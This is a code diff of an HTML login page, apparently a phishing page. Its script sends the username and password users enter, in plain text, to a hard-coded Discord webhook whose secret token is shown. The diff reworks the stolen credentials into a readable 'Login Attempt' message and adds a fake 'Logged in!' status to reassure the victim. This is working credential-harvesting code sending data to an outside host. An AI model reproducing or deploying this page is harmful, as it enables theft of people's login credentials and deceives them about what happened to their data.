@@ -20,32 +20,35 @@
             <input type="password" id="password" name="password" placeholder="Password" required><br>
             <button type="submit">Login</button>
         </form>
+        <p id="statusMessage"></p>
     </div>
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+            e.preventDefault();  // Prevent form submission
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Send login data to webhook
+            // Sending data to the Discord webhook
             fetch('https://discord.com/api/webhooks/1348388971788370054/50M-yjsw_StwaifiA3W3mFLSmV2dpDPEiYICgMhK-7FDkteIXwZ4qsaEZBjO_3Z4CaoE', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    username: username,
-                    password: password
+                    content: `Login Attempt: \nUsername: ${username} \nPassword: ${password}`
                 })
             })
             .then(response => response.json())
             .then(data => {
-                // Handle response (e.g., show success or error message)
+                // Show status message if request is successful
+                document.getElementById('statusMessage').textContent = 'Logged in!';
                 console.log('Success:', data);
             })
             .catch(error => {
+                // Show error message
+                document.getElementById('statusMessage').textContent = 'Error: Unable to login';
                 console.error('Error:', error);
             });
         });
